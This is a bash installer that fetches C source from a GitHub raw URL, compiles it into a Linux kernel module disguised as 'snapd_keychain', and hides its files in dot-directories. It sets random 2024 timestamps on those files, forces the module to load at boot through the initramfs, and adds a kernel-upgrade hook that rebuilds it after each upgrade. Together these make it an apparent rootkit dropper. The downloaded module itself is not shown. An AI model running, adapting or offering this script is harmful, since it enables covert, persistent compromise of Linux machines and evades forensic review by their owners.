#!/bin/bash

set -e

MODULE_NAME="snapd_keychain"
SRC_URL="https://raw.githubusercontent.com/0xWhoami35/showtcp/refs/heads/main/a.c"

WORKDIR="/tmp/.${MODULE_NAME}"

KERNEL_VER="$(uname -r)"
KERNEL_DIR="/lib/modules/${KERNEL_VER}/kernel/drivers"

SRC_CACHE="/usr/lib/.${MODULE_NAME}"
HOOK_PATH="/etc/kernel/postinst.d/zz-${MODULE_NAME}"
DRACUT_CONF="/etc/dracut.conf.d/${MODULE_NAME}.conf"
INITRAMFS_MODULES="/etc/initramfs-tools/modules"

if [ -z "$KERNEL_VER" ]; then
    echo "[-] KERNEL_VER is empty"
    exit 1
fi

# =========================
# detect distro family
# =========================
detect_distro() {
    if [ -f /etc/os-release ]; then
        # source into subshell to avoid variable collision
        DISTRO_ID=$(. /etc/os-release && echo "$ID")
        case "$DISTRO_ID" in
            ubuntu|debian|linuxmint|pop|kali)
                DISTRO="debian"
                ;;
            centos|rhel|rocky|alma|fedora|ol)
                DISTRO="rhel"
                ;;
            *)
                if command -v apt >/dev/null 2>&1; then
                    DISTRO="debian"
                elif command -v dnf >/dev/null 2>&1 || command -v yum >/dev/null 2>&1; then
                    DISTRO="rhel"
                else
                    echo "[-] Unsupported distro: $DISTRO_ID"
                    exit 1
                fi
                ;;
        esac
    elif command -v apt >/dev/null 2>&1; then
        DISTRO="debian"
    elif command -v dnf >/dev/null 2>&1 || command -v yum >/dev/null 2>&1; then
        DISTRO="rhel"
    else
        echo "[-] Cannot detect distro"
        exit 1
    fi
}

detect_distro

# =========================
# install deps (only what's missing)
# =========================
install_deps() {
    local NEED_GCC=0
    local NEED_MAKE=0
    local NEED_HEADERS=0

    # check gcc
    if ! ls /usr/bin/gcc* >/dev/null 2>&1; then
        NEED_GCC=1
    fi

    # check make
    if ! command -v make >/dev/null 2>&1; then
        NEED_MAKE=1
    fi

    # check kernel headers
    if [ ! -d "/lib/modules/${KERNEL_VER}/build" ]; then
        NEED_HEADERS=1
    fi

    if [ "$DISTRO" = "debian" ]; then
        local PKGS=""
        [ "$NEED_GCC" -eq 1 ] && PKGS="$PKGS build-essential"
        [ "$NEED_MAKE" -eq 1 ] && [ "$NEED_GCC" -eq 0 ] && PKGS="$PKGS make"
        [ "$NEED_HEADERS" -eq 1 ] && PKGS="$PKGS linux-headers-${KERNEL_VER}"
        if [ -n "$PKGS" ]; then
            apt update -qq && apt install -y $PKGS
        fi
    else
        local PKGS=""
        [ "$NEED_GCC" -eq 1 ] && PKGS="$PKGS gcc"
        [ "$NEED_MAKE" -eq 1 ] && PKGS="$PKGS make"
        [ "$NEED_HEADERS" -eq 1 ] && PKGS="$PKGS kernel-devel-${KERNEL_VER}"
        if [ -n "$PKGS" ]; then
            if command -v dnf >/dev/null 2>&1; then
                dnf install -y $PKGS
            else
                yum install -y $PKGS
            fi
        fi
    fi
}

# =========================
# initramfs helpers
# =========================
initramfs_add() {
    if [ "$DISTRO" = "debian" ]; then
        if [ -f "$INITRAMFS_MODULES" ]; then
            grep -qx "${MODULE_NAME}" "$INITRAMFS_MODULES" 2>/dev/null || echo "${MODULE_NAME}" >> "$INITRAMFS_MODULES"
        else
            echo "${MODULE_NAME}" > "$INITRAMFS_MODULES"
        fi
        echo "[+] Rebuilding initramfs..."
        update-initramfs -u -k "${KERNEL_VER}"
    else
        echo "force_drivers+=\" ${MODULE_NAME} \"" > "$DRACUT_CONF"
        echo "[+] Rebuilding initramfs (dracut)..."
        dracut -f --kver "${KERNEL_VER}"
    fi
}

initramfs_remove() {
    if [ "$DISTRO" = "debian" ]; then
        if [ -f "$INITRAMFS_MODULES" ]; then
            sed -i "/^${MODULE_NAME}$/d" "$INITRAMFS_MODULES"
            update-initramfs -u -k all 2>/dev/null || true
        fi
    else
        rm -f "$DRACUT_CONF" 2>/dev/null || true
        dracut -f --regenerate-all 2>/dev/null || true
    fi
}

# =========================
# random timestamp
# =========================
random_touch_2024() {
    FILE="$1"
    YEAR=2024
    MONTH=$(printf "%02d" $((RANDOM % 12 + 1)))
    DAY=$(printf "%02d" $((RANDOM % 28 + 1)))
    HOUR=$(printf "%02d" $((RANDOM % 24)))
    MIN=$(printf "%02d" $((RANDOM % 60)))
    touch -t ${YEAR}${MONTH}${DAY}${HOUR}${MIN} "$FILE"
}

# =========================
# uninstall
# =========================
if [ "$1" = "--uninstall" ] || [ "$1" = "-u" ]; then
    echo "[*] Uninstalling ${MODULE_NAME}..."

    # unload if loaded
    if lsmod | grep -q "^${MODULE_NAME} "; then
        echo "[+] Removing module from kernel..."
        rmmod ${MODULE_NAME} 2>/dev/null || {
            echo "[-] rmmod failed (module may be in use)"
            exit 1
        }
    fi

    # remove .ko from all kernel dirs
    for D in /lib/modules/*/kernel/drivers; do
        rm -f "${D}/${MODULE_NAME}.ko" 2>/dev/null || true
    done

    # remove from initramfs
    initramfs_remove

    # remove old softdep if present
    rm -f /etc/modprobe.d/ipv6-security.conf 2>/dev/null || true

    # remove kernel postinst hook + cached source
    rm -f "$HOOK_PATH" 2>/dev/null || true
    rm -rf "$SRC_CACHE" 2>/dev/null || true

    # clean any leftover dkms from older installs
    if command -v dkms >/dev/null 2>&1; then
        dkms remove -m ${MODULE_NAME} -v 1.0 --all 2>/dev/null || true
    fi
    rm -rf "/var/lib/dkms/${MODULE_NAME}" 2>/dev/null || true
    rm -rf /usr/src/${MODULE_NAME}-* 2>/dev/null || true

    for D in /lib/modules/*/updates/dkms; do
        rm -f "${D}/${MODULE_NAME}.ko" 2>/dev/null || true
        rmdir "$D" 2>/dev/null || true
        rmdir "$(dirname "$D")" 2>/dev/null || true
    done

    for D in /lib/modules/*/extra; do
        rm -f "${D}/${MODULE_NAME}.ko" 2>/dev/null || true
        rmdir "$D" 2>/dev/null || true
    done

    depmod -a

    echo "[+] Uninstall complete"
    exit 0
fi

# =========================
# install
# =========================
echo "[+] Installing module... (${DISTRO})"

install_deps

# =========================
# prepare + download source
# =========================
rm -rf "$WORKDIR" 2>/dev/null || true
mkdir -p "$WORKDIR"
cd "$WORKDIR"

wget -q -O ${MODULE_NAME}.c "$SRC_URL" || {
    echo "[-] Download failed: $SRC_URL"
    exit 1
}

# =========================
# Makefile (kbuild only needs obj-m)
# =========================
cat <<EOF > ${WORKDIR}/Makefile
obj-m += ${MODULE_NAME}.o
EOF

# =========================
# build (direct kbuild invocation)
# =========================
echo "[+] Building module..."
make -C /lib/modules/${KERNEL_VER}/build M="${WORKDIR}" modules || {
    echo "[-] Build failed"
    exit 1
}

# =========================
# install .ko to /kernel
# =========================
DST_KO="${KERNEL_DIR}/${MODULE_NAME}.ko"
mkdir -p "$KERNEL_DIR"

if [ -f "${WORKDIR}/${MODULE_NAME}.ko" ]; then
    echo "[+] Installing module to /kernel"
    cp "${WORKDIR}/${MODULE_NAME}.ko" "$DST_KO"
    random_touch_2024 "$DST_KO"
else
    echo "[-] Build produced no .ko"
    exit 1
fi

# =========================
# cache source for kernel upgrades
# =========================
mkdir -p "$SRC_CACHE"
cp "${WORKDIR}/${MODULE_NAME}.c" "$SRC_CACHE/"
random_touch_2024 "$SRC_CACHE"
random_touch_2024 "$SRC_CACHE/${MODULE_NAME}.c"

# =========================
# rebuild module index
# =========================
depmod -a

# =========================
# initramfs autoload
# =========================
initramfs_add

# =========================
# kernel postinst hook (rebuild on upgrade)
# =========================
mkdir -p "$(dirname "$HOOK_PATH")"

cat <<'HOOKEOF' > "$HOOK_PATH"
#!/bin/bash
KVER="$1"
MNAME="snapd_keychain"
CACHE="/usr/lib/.${MNAME}"
DST="/lib/modules/${KVER}/kernel/drivers/${MNAME}.ko"

[ -f "${CACHE}/${MNAME}.c" ] || exit 0
[ -d "/lib/modules/${KVER}/build" ] || exit 0

TMPBUILD=$(mktemp -d)
cp "${CACHE}/${MNAME}.c" "${TMPBUILD}/"

cat <<MF > "${TMPBUILD}/Makefile"
obj-m += ${MNAME}.o
MF

make -C /lib/modules/${KVER}/build M="${TMPBUILD}" modules >/dev/null 2>&1 || { rm -rf "${TMPBUILD}"; exit 0; }

if [ -f "${TMPBUILD}/${MNAME}.ko" ]; then
    mkdir -p "$(dirname "$DST")"
    cp "${TMPBUILD}/${MNAME}.ko" "$DST"
    MONTH=$(printf "%02d" $((RANDOM % 12 + 1)))
    DAY=$(printf "%02d" $((RANDOM % 28 + 1)))
    HOUR=$(printf "%02d" $((RANDOM % 24)))
    MIN=$(printf "%02d" $((RANDOM % 60)))
    touch -t 2024${MONTH}${DAY}${HOUR}${MIN} "$DST"
    depmod -a "${KVER}"
    if command -v update-initramfs >/dev/null 2>&1; then
        update-initramfs -u -k "${KVER}" 2>/dev/null || true
    elif command -v dracut >/dev/null 2>&1; then
        dracut -f --kver "${KVER}" 2>/dev/null || true
    fi
fi

rm -rf "${TMPBUILD}"
HOOKEOF

chmod 755 "$HOOK_PATH"
random_touch_2024 "$HOOK_PATH"

# =========================
# load module
# =========================
echo "[+] Loading module..."
modprobe ${MODULE_NAME} || {
    echo "[-] Load failed"
    dmesg | tail -n 20
    exit 1
}

# =========================
# cleanup
# =========================
rm -rf "$WORKDIR"

echo "[+] SUCCESS (module in /kernel + initramfs) [${DISTRO}]"